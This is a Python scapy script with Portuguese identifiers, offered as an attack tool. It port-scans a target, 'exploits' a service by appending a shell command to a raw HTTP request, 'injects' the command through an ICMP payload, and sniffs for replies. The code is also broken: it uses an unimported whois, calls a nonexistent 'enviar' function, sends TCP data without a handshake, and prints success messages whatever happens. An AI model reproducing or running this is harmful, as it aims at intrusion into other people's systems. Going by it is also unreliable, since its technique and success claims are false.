#!/usr/bin/env python3

from scapy.all import *
import sys
import subprocess

def reconhecer_portas_servicos(alvo, ports):
    resultado = []
    for port in ports:
        pacote = IP(dst=alvo)/TCP(sport=RandShort(), dport=port)
        resposta = sr1(pacote, timeout=1, verbose=0)
        if resposta:
            if resposta.haslayer(TCP) and resposta.getlayer(TCP).flags == 0x12:
                servico = getservbyport(port, "tcp")
                resultado.append((port, servico))
    return resultado

def explorar_servico_vulneravel(alvo, porta, comando):
    pacote = IP(dst=alvo)/TCP(sport=RandShort(), dport=porta)
    payload = "HEAD / HTTP/1.1\r\nHost: {}\r\n\r\n".format(alvo)
    payload += "{} ; {}".format(comando, whois.whois(alvo))
    pacote = pacote/Raw(load=payload.encode('utf-8'))
    resposta = sr1(pacote, timeout=3, verbose=0)
    if resposta and resposta.haslayer(TCP) and resposta.getlayer(TCP).flags == 0x17:
        print("[+] Serviço vulnerável encontrado!")

def executar_injecao_comando(alvo, comando):
    pacote = IP(dst=alvo)/ICMP()/Raw(load=comando.encode('utf-8'))
    enviar(pacote, verbose=0)
    print("[+] Comando injetado com sucesso!")

def sniffar_pacotes(filtro):
    pacotes = sniff(filter=filtro, count=1, timeout=2)
    if pacotes:
        return pacotes[0]
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} <alvo> [portas] [comando]".format(sys.argv[0]))
        sys.exit(1)

    alvo = sys.argv[1]
    ports = [80, 443] if len(sys.argv) < 3 else [int(p) for p in sys.argv[2].split(",")]
    comando = "uname -a" if len(sys.argv) < 4 else sys.argv[3]

    print("[+] Reconhecendo portas e serviços disponíveis...")
    servicos = reconhecer_portas_servicos(alvo, ports)
    print("[+] Portas e serviços disponíveis:")
    for porta, servico in servicos:
        print("Porta {}: {}".format(porta, servico))

    print("[+] Explorando serviço vulnerável...")
    explorar_servico_vulneravel(alvo, ports[0], comando)

    print("[+] Executando injecção de comando...")
    executar_injecao_comando(alvo, comando)

    print("[+] Sniffando pacotes...")
    filtro = "icmp and src {} and dst {}".format(alvo, get_if_addr(conf.iface))
    pacote = sniffar_pacotes(filtro)
    if pacote:
        print("[+] Pacote ICMP echo-request recebido!")
        print("[+] Pacote ICMP echo-reply recebido!") 
